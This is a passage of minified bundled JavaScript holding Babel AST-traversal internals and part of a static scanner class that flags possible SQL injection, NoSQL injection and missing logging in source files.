Q;if((Q=J)!=null&&Q.includes(this))return;if(J=J||[],J.push(this),this.isVariableDeclarator()){if(this.get("id").isIdentifier())return this.get("init").resolve(X,J)}else if(this.isReferencedIdentifier()){let Y=this.scope.getBinding(this.node.name);if(!Y)return;if(!Y.constant)return;if(Y.kind==="module")return;if(Y.path!==this){let W=Y.path.resolve(X,J);if(this.find((G)=>G.node===W.node))return;return W}}else if(this.isTypeCastExpression())return this.get("expression").resolve(X,J);else if(X&&this.isMemberExpression()){let Y=this.toComputedKey();if(!IE1(Y))return;let W=Y.value,G=this.get("object").resolve(X,J);if(G.isObjectExpression()){let H=G.get("properties");for(let z of H){if(!z.isProperty())continue;let $=z.get("key"),V=z.isnt("computed")&&$.isIdentifier({name:W});if(V=V||$.isLiteral({value:W}),V)return z.get("value").resolve(X,J)}}else if(G.isArrayExpression()&&!isNaN(+W)){let z=G.get("elements")[W];if(z)return z.resolve(X,J)}}}function pE1(){if(this.isIdentifier()){let X=this.scope.getBinding(this.node.name);if(!X)return!1;return X.constant}if(this.isLiteral()){if(this.isRegExpLiteral())return!1;if(this.isTemplateLiteral())return this.get("expressions").every((X)=>X.isConstantExpression());return!0}if(this.isUnaryExpression()){if(this.node.operator!=="void")return!1;return this.get("argument").isConstantExpression()}if(this.isBinaryExpression()){let{operator:X}=this.node;return X!=="in"&&X!=="instanceof"&&this.get("left").isConstantExpression()&&this.get("right").isConstantExpression()}if(this.isMemberExpression())return!this.node.computed&&this.get("object").isIdentifier({name:"Symbol"})&&!this.scope.hasBinding("Symbol",{noGlobals:!0});if(this.isCallExpression())return this.node.arguments.length===1&&this.get("callee").matchesPattern("Symbol.for")&&!this.scope.hasBinding("Symbol",{noGlobals:!0})&&this.get("arguments")[0].isStringLiteral();return!1}function dE1(){return!!(this.isProgram()?this:this.parentPath).find((Q)=>{if(Q.isProgram({sourceType:"module"}))return!0;if(Q.isClass())return!0;if(Q.isArrowFunctionExpression()&&!Q.get("body").isBlockStatement())return!1;let Y;if(Q.isFunction())Y=Q.node.body;else if(Q.isProgram())Y=Q.node;else return!1;for(let W of Y.directives)if(W.value.value==="use strict")return!0})}});var VF=v(($F)=>{Object.defineProperty($F,"__esModule",{value:!0});$F._getKey=HF;$F._getPattern=zF;$F.get=Lk1;$F.getAllNextSiblings=wk1;$F.getAllPrevSiblings=Nk1;$F.getAssignmentIdentifiers=Ik1;$F.getBindingIdentifierPaths=Sk1;$F.getBindingIdentifiers=Ck1;$F.getCompletionRecords=Fk1;$F.getNextSibling=Dk1;$F.getOpposite=Mk1;$F.getOuterBindingIdentifierPaths=Tk1;$F.getOuterBindingIdentifiers=Pk1;$F.getPrevSibling=Ak1;$F.getSibling=Rk1;var U3=v6(),$k1=y1(),{getAssignmentIdentifiers:Vk1,getBindingIdentifiers:GF,getOuterBindingIdentifiers:Kk1,numericLiteral:Uk1,unaryExpression:Zk1}=$k1,Z3=0,N7=1;function qk1(X){return{type:Z3,path:X}}function Bk1(X){return{type:N7,path:X}}function Mk1(){if(this.key==="left")return this.getSibling("right");else if(this.key==="right")return this.getSibling("left");return null}function t8(X,J,Q){if(X)J.push(...e8(X,Q));return J}function jk1(X,J,Q){let Y=[];for(let W=0;W<X.length;W++){let G=X[W],H=e8(G,Q),z=[],$=[];for(let V of H){if(V.type===Z3)z.push(V);if(V.type===N7)$.push(V)}if(z.length)Y=z;J.push(...$)}return J.push(...Y),J}function Ok1(X){X.forEach((J)=>{J.type=N7})}function K3(X,J){X.forEach((Q)=>{if(Q.path.isBreakStatement({label:null}))if(J)Q.path.replaceWith(Zk1("void",Uk1(0)));else Q.path.remove()})}function WF(X,J){let Q=[];if(J.canHaveBreak){let Y=[];for(let W=0;W<X.length;W++){let G=X[W],H=Object.assign({},J,{inCaseClause:!1});if(G.isBlockStatement()&&(J.inCaseClause||J.shouldPopulateBreak))H.shouldPopulateBreak=!0;else H.shouldPopulateBreak=!1;let z=e8(G,H);if(z.length>0&&z.every(($)=>$.type===N7)){if(Y.length>0&&z.every(($)=>$.path.isBreakStatement({label:null}))){if(Ok1(Y),Q.push(...Y),Y.some(($)=>$.path.isDeclaration())){if(Q.push(...z),!J.shouldPreserveBreak)K3(z,!0)}if(!J.shouldPreserveBreak)K3(z,!1)}else if(Q.push(...z),!J.shouldPopulateBreak&&!J.shouldPreserveBreak)K3(z,!0);break}if(W===X.length-1)Q.push(...z);else{Y=[];for(let $=0;$<z.length;$++){let V=z[$];if(V.type===N7)Q.push(V);if(V.type===Z3)Y.push(V)}}}}else if(X.length)for(let Y=X.length-1;Y>=0;Y--){let W=e8(X[Y],J);if(W.length>1||W.length===1&&!W[0].path.isVariableDeclaration()&&!W[0].path.isEmptyStatement()){Q.push(...W);break}}return Q}function e8(X,J){let Q=[];if(X.isIfStatement())Q=t8(X.get("consequent"),Q,J),Q=t8(X.get("alternate"),Q,J);else if(X.isDoExpression()||X.isFor()||X.isWhile()||X.isLabeledStatement())return t8(X.get("body"),Q,J);else if(X.isProgram()||X.isBlockStatement())return WF(X.get("body"),J);else if(X.isFunction())return e8(X.get("body"),J);else if(X.isTryStatement())Q=t8(X.get("block"),Q,J),Q=t8(X.get("handler"),Q,J);else if(X.isCatchClause())return t8(X.get("body"),Q,J);else if(X.isSwitchStatement())return jk1(X.get("cases"),Q,J);else if(X.isSwitchCase())return WF(X.get("consequent"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0,shouldPreserveBreak:J.shouldPreserveBreak});else if(X.isBreakStatement())Q.push(Bk1(X));else Q.push(qk1(X));return Q}function Fk1(X=!1){return e8(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1,shouldPreserveBreak:X}).map((Q)=>Q.path)}function Rk1(X){return U3.default.get({parentPath:this.parentPath,parent:this.parent,container:this.container,listKey:this.listKey,key:X}).setContext(this.context)}function Ak1(){return this.getSibling(this.key-1)}function Dk1(){return this.getSibling(this.key+1)}function wk1(){let X=this.key,J=this.getSibling(++X),Q=[];while(J.node)Q.push(J),J=this.getSibling(++X);return Q}function Nk1(){let X=this.key,J=this.getSibling(--X),Q=[];while(J.node)Q.push(J),J=this.getSibling(--X);return Q}function Lk1(X,J=!0){if(J===!0)J=this.context;let Q=X.split(".");if(Q.length===1)return HF.call(this,X,J);else return zF.call(this,Q,J)}function HF(X,J){let Q=this.node,Y=Q[X];if(Array.isArray(Y))return Y.map((W,G)=>{return U3.default.get({listKey:X,parentPath:this,parent:Q,container:Y,key:G}).setContext(J)});else return U3.default.get({parentPath:this,parent:Q,container:Q,key:X}).setContext(J)}function zF(X,J){let Q=this;for(let Y of X)if(Y===".")Q=Q.parentPath;else if(Array.isArray(Q))Q=Q[Y];else Q=Q.get(Y,J);return Q}function Ik1(){return Vk1(this.node)}function Ck1(X){return GF(this.node,X)}function Pk1(X){return Kk1(this.node,X)}function Sk1(X=!1,J=!1){let Y=[this],W=Object.create(null);while(Y.length){let G=Y.shift();if(!G)continue;if(!G.node)continue;let H=GF.keys[G.node.type];if(G.isIdentifier()){if(X)(W[G.node.name]=W[G.node.name]||[]).push(G);else W[G.node.name]=G;continue}if(G.isExportDeclaration()){let z=G.get("declaration");if(z.isDeclaration())Y.push(z);continue}if(J){if(G.isFunctionDeclaration()){Y.push(G.get("id"));continue}if(G.isFunctionExpression())continue}if(H)for(let z=0;z<H.length;z++){let $=H[z],V=G.get($);if(Array.isArray(V))Y.push(...V);else if(V.node)Y.push(V)}}return W}function Tk1(X=!1){return this.getBindingIdentifierPaths(X,!0)}});var ZF=v((UF)=>{Object.defineProperty(UF,"__esModule",{value:!0});UF.addComment=nk1;UF.addComments=sk1;UF.shareCommentsWithSiblings=ak1;var dk1=y1(),{addComment:ik1,addComments:rk1}=dk1;function ak1(){if(typeof this.key==="string")return;let X=this.node;if(!X)return;let{trailingComments:J,leadingComments:Q}=X;if(!J&&!Q)return;let Y=this.getSibling(this.key-1),W=this.getSibling(this.key+1),G=Boolean(Y.node),H=Boolean(W.node);if(G){if(Q)Y.addComments("trailing",KF(Q,Y.node.trailingComments));if(J&&!H)Y.addComments("trailing",J)}if(H){if(J)W.addComments("leading",KF(J,W.node.leadingComments));if(Q&&!G)W.addComments("leading",Q)}}function KF(X,J){if(!(J!=null&&J.length))return X;let Q=new Set(J);return X.filter((Y)=>{return!Q.has(Y)})}function nk1(X,J,Q){ik1(this.node,X,J,Q)}function sk1(X,J){rk1(this.node,X,J)}});var v6=v((OF)=>{Object.defineProperty(OF,"__esModule",{value:!0});OF.default=OF.SHOULD_STOP=OF.SHOULD_SKIP=OF.REMOVED=void 0;var Xb1=c2(),Jb1=bV(),Qb1=K7(),Yb1=QW(),MF=y1(),v4=MF,Wb1=gX(),Gb1=oM(),K6=eM(),XJ=wj(),JJ=cW(),qF=FO(),aX=sO(),D0=YF(),jF=l9(),R0=jF,QJ=P4(),U6=S4(),t0=VF(),q3=ZF(),Hb1=oY(),{validate:zb1}=MF,BF=Jb1("babel"),wo1=OF.REMOVED=1,No1=OF.SHOULD_STOP=2,Lo1=OF.SHOULD_SKIP=4,f6=OF.default=class X{constructor(J,Q){this.contexts=[],this.state=null,this.opts=null,this._traverseFlags=0,this.skipKeys=null,this.parentPath=null,this.container=null,this.listKey=null,this.key=null,this.node=null,this.type=null,this._store=null,this.parent=Q,this.hub=J,this.data=null,this.context=null,this.scope=null}get removed(){return(this._traverseFlags&1)>0}set removed(J){if(J)this._traverseFlags|=1;else this._traverseFlags&=-2}get shouldStop(){return(this._traverseFlags&2)>0}set shouldStop(J){if(J)this._traverseFlags|=2;else this._traverseFlags&=-3}get shouldSkip(){return(this._traverseFlags&4)>0}set shouldSkip(J){if(J)this._traverseFlags|=4;else this._traverseFlags&=-5}static get({hub:J,parentPath:Q,parent:Y,container:W,listKey:G,key:H}){if(!J&&Q)J=Q.hub;if(!Y)throw Error("To get a node path the parent needs to exist");let z=W[H],$=Wb1.getOrCreateCachedPaths(Y,Q),V=$.get(z);if(!V){if(V=new X(J,Y),z)$.set(z,V)}return jF.setup.call(V,Q,W,G,H),V}getScope(J){return this.isScope()?new Yb1.default(this):J}setData(J,Q){if(this.data==null)this.data=Object.create(null);return this.data[J]=Q}getData(J,Q){if(this.data==null)this.data=Object.create(null);let Y=this.data[J];if(Y===void 0&&Q!==void 0)Y=this.data[J]=Q;return Y}hasNode(){return this.node!=null}buildCodeFrameError(J,Q=SyntaxError){return this.hub.buildError(this.node,J,Q)}traverse(J,Q){(0,Qb1.default)(this.node,J,this.scope,Q,this)}set(J,Q){zb1(this.node,J,Q),this.node[J]=Q}getPathLocation(){let J=[],Q=this;do{let Y=Q.key;if(Q.inList)Y=`${Q.listKey}[${Y}]`;J.unshift(Y)}while(Q=Q.parentPath);return J.join(".")}debug(J){if(!BF.enabled)return;BF(`${this.getPathLocation()} ${this.type}: ${J}`)}toString(){return(0,Gb1.default)(this.node).code}get inList(){return!!this.listKey}set inList(J){if(!J)this.listKey=null}get parentKey(){return this.listKey||this.key}},$b1={findParent:K6.findParent,find:K6.find,getFunctionParent:K6.getFunctionParent,getStatementParent:K6.getStatementParent,getEarliestCommonAncestorFrom:K6.getEarliestCommonAncestorFrom,getDeepestCommonAncestorFrom:K6.getDeepestCommonAncestorFrom,getAncestry:K6.getAncestry,isAncestor:K6.isAncestor,isDescendant:K6.isDescendant,inType:K6.inType,getTypeAnnotation:XJ.getTypeAnnotation,isBaseType:XJ.isBaseType,couldBeBaseType:XJ.couldBeBaseType,baseTypeStrictlyMatches:XJ.baseTypeStrictlyMatches,isGenericType:XJ.isGenericType,replaceWithMultiple:JJ.replaceWithMultiple,replaceWithSourceString:JJ.replaceWithSourceString,replaceWith:JJ.replaceWith,replaceExpressionWithStatements:JJ.replaceExpressionWithStatements,replaceInline:JJ.replaceInline,evaluateTruthy:qF.evaluateTruthy,evaluate:qF.evaluate,toComputedKey:aX.toComputedKey,ensureBlock:aX.ensureBlock,unwrapFunctionEnvironment:aX.unwrapFunctionEnvironment,arrowFunctionToExpression:aX.arrowFunctionToExpression,splitExportDeclaration:aX.splitExportDeclaration,ensureFunctionName:aX.ensureFunctionName,matchesPattern:D0.matchesPattern,isStatic:D0.isStatic,isNodeType:D0.isNodeType,canHaveVariableDeclarationOrExpression:D0.canHaveVariableDeclarationOrExpression,canSwapBetweenExpressionAndStatement:D0.canSwapBetweenExpressionAndStatement,isCompletionRecord:D0.isCompletionRecord,isStatementOrBlock:D0.isStatementOrBlock,referencesImport:D0.referencesImport,getSource:D0.getSource,willIMaybeExecuteBefore:D0.willIMaybeExecuteBefore,_guessExecutionStatusRelativeTo:D0._guessExecutionStatusRelativeTo,resolve:D0.resolve,isConstantExpression:D0.isConstantExpression,isInStrictMode:D0.isInStrictMode,isDenylisted:R0.isDenylisted,visit:R0.visit,skip:R0.skip,skipKey:R0.skipKey,stop:R0.stop,setContext:R0.setContext,requeue:R0.requeue,requeueComputedKeyAndDecorators:R0.requeueComputedKeyAndDecorators,remove:QJ.remove,insertBefore:U6.insertBefore,insertAfter:U6.insertAfter,unshiftContainer:U6.unshiftContainer,pushContainer:U6.pushContainer,getOpposite:t0.getOpposite,getCompletionRecords:t0.getCompletionRecords,getSibling:t0.getSibling,getPrevSibling:t0.getPrevSibling,getNextSibling:t0.getNextSibling,getAllNextSiblings:t0.getAllNextSiblings,getAllPrevSiblings:t0.getAllPrevSiblings,get:t0.get,getAssignmentIdentifiers:t0.getAssignmentIdentifiers,getBindingIdentifiers:t0.getBindingIdentifiers,getOuterBindingIdentifiers:t0.getOuterBindingIdentifiers,getBindingIdentifierPaths:t0.getBindingIdentifierPaths,getOuterBindingIdentifierPaths:t0.getOuterBindingIdentifierPaths,shareCommentsWithSiblings:q3.shareCommentsWithSiblings,addComment:q3.addComment,addComments:q3.addComments};Object.assign(f6.prototype,$b1);f6.prototype.arrowFunctionToShadowed=aX[String("arrowFunctionToShadowed")],Object.assign(f6.prototype,{has:D0[String("has")],is:D0[String("is")],isnt:D0[String("isnt")],equals:D0[String("equals")],hoist:U6[String("hoist")],updateSiblingKeys:U6.updateSiblingKeys,call:R0.call,isBlacklisted:R0[String("isBlacklisted")],setScope:R0.setScope,resync:R0.resync,popContext:R0.popContext,pushContext:R0.pushContext,setup:R0.setup,setKey:R0.setKey});f6.prototype._guessExecutionStatusRelativeToDifferentFunctions=D0._guessExecutionStatusRelativeTo,f6.prototype._guessExecutionStatusRelativeToDifferentFunctions=D0._guessExecutionStatusRelativeTo,Object.assign(f6.prototype,{_getTypeAnnotation:XJ._getTypeAnnotation,_replaceWith:JJ._replaceWith,_resolve:D0._resolve,_call:R0._call,_resyncParent:R0._resyncParent,_resyncKey:R0._resyncKey,_resyncList:R0._resyncList,_resyncRemoved:R0._resyncRemoved,_getQueueContexts:R0._getQueueContexts,_removeFromScope:QJ._removeFromScope,_callRemovalHooks:QJ._callRemovalHooks,_remove:QJ._remove,_markRemoved:QJ._markRemoved,_assertUnremoved:QJ._assertUnremoved,_containerInsert:U6._containerInsert,_containerInsertBefore:U6._containerInsertBefore,_containerInsertAfter:U6._containerInsertAfter,_verifyNodeList:U6._verifyNodeList,_getKey:t0._getKey,_getPattern:t0._getPattern});for(let X of v4.TYPES){let J=`is${X}`,Q=v4[J];f6.prototype[J]=function(Y){return Q(this.node,Y)},f6.prototype[`assert${X}`]=function(Y){if(!Q(this.node,Y))throw TypeError(`Expected node path of type ${X}`)}}Object.assign(f6.prototype,Hb1);for(let X of Object.keys(Xb1)){if(X[0]==="_")continue;if(!v4.TYPES.includes(X))v4.TYPES.push(X)}});var wF=v((AF)=>{Object.defineProperty(AF,"__esModule",{value:!0});AF.default=void 0;var Zb1=v6(),qb1=y1(),B3=l9(),{VISITOR_KEYS:Bb1}=qb1;class RF{constructor(X,J,Q,Y){this.queue=null,this.priorityQueue=null,this.parentPath=Y,this.scope=X,this.state=Q,this.opts=J}shouldVisit(X){let J=this.opts;if(J.enter||J.exit)return!0;if(J[X.type])return!0;let Q=Bb1[X.type];if(!(Q!=null&&Q.length))return!1;for(let Y of Q)if(X[Y])return!0;return!1}create(X,J,Q,Y){return Zb1.default.get({parentPath:this.parentPath,parent:X,container:J,key:Q,listKey:Y})}maybeQueue(X,J){if(this.queue)if(J)this.queue.push(X);else this.priorityQueue.push(X)}visitMultiple(X,J,Q){if(X.length===0)return!1;let Y=[];for(let W=0;W<X.length;W++){let G=X[W];if(G&&this.shouldVisit(G))Y.push(this.create(J,X,W,Q))}return this.visitQueue(Y)}visitSingle(X,J){if(this.shouldVisit(X[J]))return this.visitQueue([this.create(X,X,J)]);else return!1}visitQueue(X){this.queue=X,this.priorityQueue=[];let J=new WeakSet,Q=!1,Y=0;for(;Y<X.length;){let W=X[Y];if(Y++,B3.resync.call(W),W.contexts.length===0||W.contexts[W.contexts.length-1]!==this)B3.pushContext.call(W,this);if(W.key===null)continue;let{node:G}=W;if(J.has(G))continue;if(G)J.add(G);if(W.visit()){Q=!0;break}if(this.priorityQueue.length){if(Q=this.visitQueue(this.priorityQueue),this.priorityQueue=[],this.queue=X,Q)break}}for(let W=0;W<Y;W++)B3.popContext.call(X[W]);return this.queue=null,Q}visit(X,J){let Q=X[J];if(!Q)return!1;if(Array.isArray(Q))return this.visitMultiple(Q,X,J);else return this.visitSingle(X,J)}}AF.default=RF});var z4=v((NF)=>{Object.defineProperty(NF,"__esModule",{value:!0});NF.traverseNode=Fb1;var Mb1=wF(),Po1=v6(),jb1=y1(),So1=l9(),{VISITOR_KEYS:Ob1}=jb1;function Fb1(X,J,Q,Y,W,G,H){let z=Ob1[X.type];if(!z)return!1;let $=new Mb1.default(Q,J,Y,W);if(H){if(G!=null&&G[W.parentKey])return!1;return $.visitQueue([W])}for(let V of z){if(G!=null&&G[V])continue;if($.visit(X,V))return!0}return!1}});var l9=v((EF)=>{Object.defineProperty(EF,"__esModule",{value:!0});EF._call=j3;EF._getQueueContexts=fb1;EF._resyncKey=TF;EF._resyncList=_F;EF._resyncParent=SF;EF._resyncRemoved=Tb1;EF.call=M3;EF.isDenylisted=CF;EF.popContext=_b1;EF.pushContext=Eb1;EF.requeue=bb1;EF.requeueComputedKeyAndDecorators=vb1;EF.resync=Sb1;EF.setContext=Pb1;EF.setKey=f4;EF.setScope=PF;EF.setup=kb1;EF.skip=Lb1;EF.skipKey=Ib1;EF.stop=Cb1;EF.visit=Nb1;var Ab1=z4(),LF=v6(),Db1=P4(),wb1=y1();function M3(X){let J=this.opts;if(this.debug(X),this.node){if(j3.call(this,J[X]))return!0}if(this.node){var Q;return j3.call(this,(Q=J[this.node.type])==null?void 0:Q[X])}return!1}function j3(X){if(!X)return!1;for(let J of X){if(!J)continue;let Q=this.node;if(!Q)return!0;let Y=J.call(this.state,this,this.state);if(Y&&typeof Y==="object"&&typeof Y.then==="function")throw Error("You appear to be using a plugin with an async traversal visitor, which your current version of Babel does not support. If you're using a published plugin, you may need to upgrade your @babel/core version.");if(Y)throw Error(`Unexpected return value from visitor method ${J}`);if(this.node!==Q)return!0;if(this._traverseFlags>0)return!0}return!1}function CF(){var X;let J=(X=this.opts.denylist)!=null?X:this.opts.blacklist;return J==null?void 0:J.includes(this.node.type)}EF.isBlacklisted=CF;function IF(X,J){if(X.context!==J)X.context=J,X.state=J.state,X.opts=J.opts}function Nb1(){var X,J;if(!this.node)return!1;if(this.isDenylisted())return!1;if((X=(J=this.opts).shouldSkip)!=null&&X.call(J,this))return!1;let Q=this.context;if(this.shouldSkip||M3.call(this,"enter"))return this.debug("Skip..."),this.shouldStop;return IF(this,Q),this.debug("Recursing into..."),this.shouldStop=(0,Ab1.traverseNode)(this.node,this.opts,this.scope,this.state,this,this.skipKeys),IF(this,Q),M3.call(this,"exit"),this.shouldStop}function Lb1(){this.shouldSkip=!0}function Ib1(X){if(this.skipKeys==null)this.skipKeys={};this.skipKeys[X]=!0}function Cb1(){this._traverseFlags|=LF.SHOULD_SKIP|LF.SHOULD_STOP}function PF(){var X,J;if((X=this.opts)!=null&&X.noScope)return;let Q=this.parentPath;if((this.key==="key"||this.listKey==="decorators")&&Q.isMethod()||this.key==="discriminant"&&Q.isSwitchStatement())Q=Q.parentPath;let Y;while(Q&&!Y){var W;if((W=Q.opts)!=null&&W.noScope)return;Y=Q.scope,Q=Q.parentPath}this.scope=this.getScope(Y),(J=this.scope)==null||J.init()}function Pb1(X){if(this.skipKeys!=null)this.skipKeys={};if(this._traverseFlags=0,X)this.context=X,this.state=X.state,this.opts=X.opts;return PF.call(this),this}function Sb1(){if(this.removed)return;SF.call(this),_F.call(this),TF.call(this)}function SF(){if(this.parentPath)this.parent=this.parentPath.node}function TF(){if(!this.container)return;if(this.node===this.container[this.key])return;if(Array.isArray(this.container)){for(let X=0;X<this.container.length;X++)if(this.container[X]===this.node){f4.call(this,X);return}}else for(let X of Object.keys(this.container))if(this.container[X]===this.node){f4.call(this,X);return}this.key=null}function _F(){if(!this.parent||!this.inList)return;let X=this.parent[this.listKey];if(this.container===X)return;this.container=X||null}function Tb1(){if(this.key==null||!this.container||this.container[this.key]!==this.node)Db1._markRemoved.call(this)}function _b1(){if(this.contexts.pop(),this.contexts.length>0)this.setContext(this.contexts[this.contexts.length-1]);else this.setContext(void 0)}function Eb1(X){this.contexts.push(X),this.setContext(X)}function kb1(X,J,Q,Y){this.listKey=Q,this.container=J,this.parentPath=X||this.parentPath,f4.call(this,Y)}function f4(X){var J;this.key=X,this.node=this.container[this.key],this.type=(J=this.node)==null?void 0:J.type}function bb1(X=this){if(X.removed)return;let J=this.contexts;for(let Q of J)Q.maybeQueue(X)}function vb1(){let{context:X,node:J}=this;if(!wb1.isPrivate(J)&&J.computed)X.maybeQueue(this.get("key"));if(J.decorators)for(let Q of this.get("decorators"))X.maybeQueue(Q)}function fb1(){let X=this,J=this.contexts;while(!J.length){if(X=X.parentPath,!X)break;J=X.contexts}return J}});var fF=v((bF)=>{Object.defineProperty(bF,"__esModule",{value:!0});bF.default=void 0;class kF{getCode(){}getScope(){}addHelper(){throw Error("Helpers are not supported by the default hub.")}buildError(X,J,Q=TypeError){return new Q(J)}}bF.default=kF});var K7=v((C7)=>{Object.defineProperty(C7,"__esModule",{value:!0});Object.defineProperty(C7,"Hub",{enumerable:!0,get:function(){return zv1.default}});Object.defineProperty(C7,"NodePath",{enumerable:!0,get:function(){return Gv1.default}});Object.defineProperty(C7,"Scope",{enumerable:!0,get:function(){return Hv1.default}});C7.visitors=C7.default=void 0;l9();var I7=G4();C7.visitors=I7;var Yv1=y1(),Wv1=gX(),xF=z4(),Gv1=v6(),Hv1=QW(),zv1=fF(),{VISITOR_KEYS:$v1,removeProperties:Vv1,traverseFast:L7}=Yv1;function i9(X,J={},Q,Y,W,G){if(!X)return;if(!J.noScope&&!Q){if(X.type!=="Program"&&X.type!=="File")throw Error(`You must pass a scope and parentPath unless traversing a Program/File. Instead of that you tried to traverse a ${X.type} node without passing scope and parentPath.`)}if(!W&&G)throw Error("visitSelf can only be used when providing a NodePath.");if(!$v1[X.type])return;I7.explode(J),(0,xF.traverseNode)(X,J,Q,Y,W,null,G)}var bo1=C7.default=i9;i9.visitors=I7;i9.verify=I7.verify;i9.explode=I7.explode;i9.cheap=function(X,J){L7(X,J);return};i9.node=function(X,J,Q,Y,W,G){(0,xF.traverseNode)(X,J,Q,Y,W,G)};i9.clearNode=function(X,J){Vv1(X,J)};i9.removeProperties=function(X,J){return L7(X,i9.clearNode,J),X};i9.hasType=function(X,J,Q){if(Q!=null&&Q.includes(X.type))return!1;if(X.type===J)return!0;return L7(X,function(Y){if(Q!=null&&Q.includes(Y.type))return L7.skip;if(Y.type===J)return L7.stop})};i9.cache=Wv1});class F3{astCache=new WeakMap;activeTraversals=new Set;cleanup(){if(this.activeTraversals.clear(),this.astCache=new WeakMap,typeof global<"u"&&Bv1(global))global.gc()}async scanFile(X,J,Q){let Y=[];if(this.isTestFile(X))return[];console.log(`[AST] Scanning file: ${X}`),console.log(`[AST] Total patterns: ${Q.length}`);let W=Q.filter((H)=>{if(H.patterns?.regex&&H.patterns.regex.length>0){let z=H.patterns.regex.some(($)=>$.test(J));if(z)console.log(`[AST] Pattern ${H.id} matched via regex`);return z}return!1});if(console.log(`[AST] Candidate patterns after regex filter: ${W.length}`),W.length===0)return Y;if(this.isJavaScriptFile(X)){let H=null;try{H=uF.parse(J,{sourceType:"module",plugins:["jsx","typescript"],errorRecovery:!0})}catch(z){return this.regexOnlyFallback(X,J,W)}try{for(let z of W)if(z.astRules){console.log(`[AST] Applying AST rules for pattern ${z.id}`);let $=this.applyASTPattern(H,z,X,J);console.log(`[AST] Found ${$.length} issues with AST rules`),Y.push(...$)}else{console.log(`[AST] Pattern ${z.id} has no AST rules, using regex`);let $=this.applyRegexPattern(J,z,X);Y.push(...$)}}finally{H=null}}else return this.regexOnlyFallback(X,J,W);return Y.filter((H)=>H.confidence>=(H.pattern.minConfidence??qv1))}applyASTPattern(X,J,Q,Y){let W=[],G=J.astRules,H=this,z={ast:X,active:!0};this.activeTraversals.add(z);try{cF.default(X,{enter($){if(G.node_type&&$.node.type!==G.node_type)return;let V=!1,K=J.confidenceRules?.base||0.8,Z=J.type.toLowerCase().replace(/_/g," "),q=$.node?.loc,B=$.node?.start,M=$.node?.end;switch(Z){case"sql injection":V=H.checkSQLInjection($,G,J);break;case"logging":V=H.checkMissingLogging($,G,J);break;case"nosql injection":V=H.checkNoSQLInjection($,G,J);break;default:V=H.checkGenericPattern($,G,J)}if(V){if(K=H.calculateConfidence($,K,J.confidenceRules?.adjustments||{}),q)W.push({pattern:J,file:Q,line:q.start.line,column:q.start.column,code:Y.substring(B||0,M||0),confidence:K})}}})}finally{z.active=!1,this.activeTraversals.delete(z)}return W}checkSQLInjection(X,J,Q){let Y=X.node;if(w1.isBinaryExpression(Y)&&Y.operator==="+"){let W=this.getFullConcatenatedString(X),G=O3.test(W);if(console.log(`[AST] SQL check: BinaryExpression found, hasSQL=${G}, expression="${W}"`),G&&this.hasConcatenatedUserInput(X)){if(this.isInDatabaseCall(X)||this.isAssignedToQueryVariable(X))return![Q.contextRules?.exclude_if_parameterized&&this.isParameterizedQuery(X),Q.contextRules?.exclude_if_logging_only&&this.isOnlyUsedForLogging(X)].some(Boolean)}}if(w1.isTemplateLiteral(Y)){let W=Y.quasis.some((H)=>O3.test(H.value.raw)),G=Y.expressions.some((H)=>this.containsUserInput(H,X));if(W&&G)return!(Q.contextRules?.exclude_if_parameterized&&this.isParameterizedQuery(X))}return!1}checkMissingLogging(X,J,Q){let Y=X.node;if(!w1.isFunctionDeclaration(Y))return!1;if(J.name_matches&&Y.id){if(!new RegExp(J.name_matches).test(Y.id.name))return!1;let G=this.getBodyString(Y);if(new RegExp(J.body_excludes||"log|logger").test(G))return!1;if(Q.contextRules?.exclude_if_delegates){if(this.delegatesToOtherFunction(Y))return!1}return!0}return!1}checkNoSQLInjection(X,J,Q){let Y=X.node;if(!w1.isCallExpression(Y))return!1;if(w1.isMemberExpression(Y.callee)&&w1.isIdentifier(Y.callee.property)){let W=Y.callee.property.name;if(!J.method_names?.includes(W))return!1;let G=Y.arguments[0];if(w1.isObjectExpression(G)){if(G.properties.some(($)=>w1.isObjectProperty($)&&w1.isIdentifier($.key)&&J.argument_contains?.dangerous_keys?.includes($.key.name)))return!0;return G.properties.some(($)=>w1.isObjectProperty($)?this.containsUserInput($.value,X):!1)}}return!1}checkGenericPattern(X,J,Q){return!1}traverseAncestors(X,J,Q=Zv1){let Y=X,W=0;while(Y&&W<Q){let G=Y.parentPath;if(!G)break;if(J(G.node))return!0;Y=G,W++}return!1}isTestFile(X){return[/\.test\.[jt]sx?$/,/\.spec\.[jt]sx?$/,/\/__tests__\//,/\/test\//,/\/spec\//].some((Q)=>Q.test(X))}isJavaScriptFile(X){return[/\.[jt]sx?$/,/\.mjs$/,/\.cjs$/].some((Q)=>Q.test(X))}isInDatabaseCall(X){return this.traverseAncestors(X,(J)=>{if(w1.isCallExpression(J)&&w1.isMemberExpression(J.callee)){let Q=J.callee.property;return w1.isIdentifier(Q)&&Uv1.includes(Q.name)}return!1})}containsUserInput(X,J,Q=0){if(!X||Q>gF)return!1;if(w1.isMemberExpression(X)){let Y=this.getObjectName(X);return yF.includes(Y)}if(w1.isIdentifier(X))try{let Y=J.scope.getBinding(X.name);if(Y?.path.isVariableDeclarator()){let W=Y.path.node.init;if(w1.isMemberExpression(W)){let G=this.getObjectName(W);return yF.includes(G)}}}catch{}return!1}getObjectName(X){if(w1.isMemberExpression(X)&&w1.isIdentifier(X.object))return X.object.name;return""}isParameterizedQuery(X){let J=X.parent;if(w1.isCallExpression(J))return J.arguments.length>1||w1.isTemplateLiteral(J.arguments[0])&&J.arguments[0].quasis.some((Q)=>Q.value.raw.includes("?"));return!1}getBodyString(X){return mF(X)?X.body.body.map((J)=>J.type).join(" "):""}delegatesToOtherFunction(X){return mF(X)&&X.body.body.some((J)=>w1.isReturnStatement(J)&&w1.isCallExpression(J.argument))}calculateConfidence(X,J,Q){let Y=J,W={direct_req_param_concat:this.hasConcatenatedUserInput(X),within_db_query_call:this.isInDatabaseCall(X)||this.isAssignedToQueryVariable(X),has_sql_keywords:w1.isBinaryExpression(X.node)&&O3.test(this.getFullConcatenatedString(X)),is_console_log:this.isInConsoleLog(X),direct_user_input:this.hasDirectUserInput(X),has_validation:this.hasValidation(X),is_test_code:this.isInTestCode(X),in_test_file:this.isTestFile("")};for(let[G,H]of Object.entries(W))if(Q[G]&&H)Y+=Q[G];return Math.max(0,Math.min(1,Y))}hasDirectUserInput(X){return!1}hasValidation(X){return!1}isInTestCode(X){return!1}getFullConcatenatedString(X){let J=X.node;if(w1.isBinaryExpression(J)){let 